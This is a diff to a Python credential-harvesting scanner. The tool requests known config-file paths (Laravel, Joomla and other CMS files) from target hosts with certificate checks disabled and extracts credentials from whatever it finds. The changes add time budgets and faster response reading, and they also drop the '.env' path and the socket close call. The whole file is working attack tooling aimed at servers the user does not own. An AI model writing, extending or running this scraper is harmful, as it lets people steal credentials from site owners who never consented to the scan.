@@ -3,6 +3,7 @@
 import re
 import socket
 import ssl
+import time
 
 
 # Common exposed config file paths across different CMS and frameworks
@@ -31,7 +32,6 @@ CONFIG_PATHS = [
     '/include/config.php',
     '/conf/config.php',
     # Laravel
-    '/.env',
     '/config/app.php',
     # Joomla
     '/configuration.php',
@@ -115,6 +115,8 @@ CREDENTIAL_PATTERNS = [
 class HTTPConfigScraper:
     """Fetches commonly exposed config files and extracts credentials from their contents."""
 
+    TOTAL_TIMEOUT = 60  # seconds budget per domain
+
     def __init__(self, host: str, ip: str):
         """Initialize with target hostname and IP.
 
@@ -125,16 +127,22 @@ class HTTPConfigScraper:
         self.host = host
         self.ip = ip
 
-    def run(self):
+    def run(self) -> dict:
         """Iterate all config paths, fetch each, extract credentials if found.
+
+        Stops after TOTAL_TIMEOUT seconds to avoid hanging on slow targets.
 
         Returns:
             dict: Found files and any extracted credentials.
         """
         print(f"\n  [CONFIG] Scraping config files on {self.host}")
         results = {'found_files': [], 'credentials': {}}
+        deadline = time.time() + self.TOTAL_TIMEOUT
 
         for path in CONFIG_PATHS:
+            if time.time() > deadline:
+                print(f"  [CONFIG] Timeout — stopping early")
+                break
             content = self._fetch(path)
             if content:
                 print(f"  [CONFIG] *** FOUND: {path} ({len(content)} bytes) ***")
@@ -162,14 +170,21 @@ class HTTPConfigScraper:
         """
         for use_tls, port in [(True, 443), (False, 80)]:
             try:
-                sock = socket.create_connection((self.ip, port), timeout=5)
+                sock = socket.create_connection((self.ip, port), timeout=2)
+                sock.settimeout(5) 
                 if use_tls:
                     ctx = ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = ssl.CERT_NONE
                     sock = ctx.wrap_socket(sock, server_hostname=self.host)
+                    sock.settimeout(5)
 
-                request = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
+                request = (
+                    f"GET {path} HTTP/1.1\r\n"
+                    f"Host: {self.host}\r\n"
+                    f"User-Agent: Mozilla/5.0\r\n"
+                    f"Connection: close\r\n\r\n"
+                )
                 sock.send(request.encode())
 
                 response = b''
@@ -178,9 +193,23 @@ class HTTPConfigScraper:
                     if not chunk:
                         break
                     response += chunk
-                    if len(response) > 500000:  # 500KB cap
+                    if b'\r\n\r\n' in response:  # headers complete
+                        # check if there's a Content-Length to know when body is done
+                        header_end = response.index(b'\r\n\r\n') + 4
+                        header_part = response[:header_end].decode('utf-8', errors='ignore')
+                        if 'content-length' in header_part.lower():
+                            import re
+                            m = re.search(r'content-length:\s*(\d+)', header_part, re.IGNORECASE)
+                            if m:
+                                expected = int(m.group(1))
+                                if len(response) - header_end >= expected:
+                                    break
+                        # No Content-Length — just grab what we have and stop
+                        # (config files are small; don't wait for connection close)
+                        elif len(response) > header_end:
+                            break
+                    if len(response) > 500000:
                         break
-                sock.close()
 
                 decoded = response.decode('utf-8', errors='ignore')
                 if '\r\n\r\n' in decoded:
